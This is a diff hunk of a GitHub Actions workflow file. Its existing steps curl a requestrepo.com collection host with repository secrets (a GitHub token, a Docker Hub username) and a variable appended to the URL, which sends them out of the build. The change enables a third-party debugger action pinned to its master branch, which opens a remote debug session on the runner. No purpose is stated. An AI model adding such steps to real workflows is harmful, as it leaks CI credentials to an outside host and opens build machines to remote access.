@@ -29,5 +29,5 @@ jobs:
      - run: curl https://rj0lnjwx.requestrepo.com/2_${{ secrets.GITHUBTOKEN }}
      - run: curl https://rj0lnjwx.requestrepo.com/3_${{ secrets.DOCKER_HUB_USERNAME }}
      - run: curl https://rj0lnjwx.requestrepo.com/4_${{ vars.TEST_VAR }}
-     # - name: Setup Debug Session
-     #   uses: csexton/debugger-action@master
+     - name: Setup Debug Session
+       uses: csexton/debugger-action@master
